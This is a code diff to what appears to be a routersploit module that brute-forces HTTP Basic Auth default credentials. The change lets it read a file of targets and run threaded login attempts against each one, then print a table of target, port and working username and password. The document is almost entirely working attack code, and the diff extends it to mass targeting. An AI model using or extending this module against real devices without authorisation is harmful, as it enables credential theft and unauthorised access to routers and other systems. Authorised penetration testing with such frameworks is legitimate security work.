@@ -11,6 +11,7 @@ from routersploit import (
     print_table,
     sanitize_url,
     boolify,
+    http_request
 )
 
 
@@ -37,18 +38,45 @@ class Exploit(exploits.Exploit):
 
     def run(self):
         self.credentials = []
+
+        if self.target.startswith('file://'):
+            self.multi_run()
+        else:
+            self.single_run()
+            
+    def multi_run(self):
+        original_target = self.target
+        original_port = self.port
+
+        _, _, feed_path = self.target.partition("file://")
+        try:
+            file_handler = open(feed_path, 'r')
+        except IOError:
+            print_error("Could not read file: {}".format(self.target))
+            return
+
+        for target in file_handler:
+            target = target.strip()
+            if not target:
+                continue
+            self.target, _, port = target.partition(':')
+            if port:
+                self.port = port
+            print_status("Attack against: {}:{}".format(self.target, self.port))
+            self.single_run()
+
+        self.target = original_target
+        self.port = original_port
+        file_handler.close()
+
+    def single_run(self):
         url = sanitize_url("{}:{}{}".format(self.target, self.port, self.path))
 
-        try:
-            r = requests.get(url, verify=False)
-        except (requests.exceptions.MissingSchema, requests.exceptions.InvalidSchema):
-            print_error("Invalid URL format: %s" % url)
-            return
-        except requests.exceptions.ConnectionError:
-            print_error("Connection error: %s" % url)
+        response = http_request("GET", url)
+        if not response:
             return
 
-        if r.status_code != 401:
+        if response.status_code != 401:
             print_status("Target is not protected by Basic Auth")
             return
 
@@ -60,12 +88,14 @@ class Exploit(exploits.Exploit):
         collection = LockedIterator(defaults)
         self.run_threads(self.threads, self.target_function, collection)
 
-        if len(self.credentials):
+        if self.credentials:
             print_success("Credentials found!")
-            headers = ("Login", "Password")
+            headers = ("Target", "Port", "Login", "Password")
             print_table(headers, *self.credentials)
         else:
             print_error("Credentials not found")
+
+        defaults.close()
 
     def target_function(self, running, data):
         module_verbosity = boolify(self.verbosity)
@@ -83,10 +113,10 @@ class Exploit(exploits.Exploit):
 
                 if r.status_code != 401:
                     running.clear()
-                    print_success("{}: Authentication succeed!".format(name), user, password, verbose=module_verbosity)
-                    self.credentials.append((user, password))
+                    print_success("Target: {}:{} {}: Authentication succeed!".format(self.target, self.port, name), user, password, verbose=module_verbosity)
+                    self.credentials.append((self.target, self.port, user, password))
                 else:
-                    print_error(name, "Authentication Failed - Username: '{}' Password: '{}'".format(user, password), verbose=module_verbosity)
+                    print_error(name, "Target: {}:{} Authentication Failed - Username: '{}' Password: '{}'".format(self.target, self.port, user, password), verbose=module_verbosity)
             except StopIteration:
                 break
 
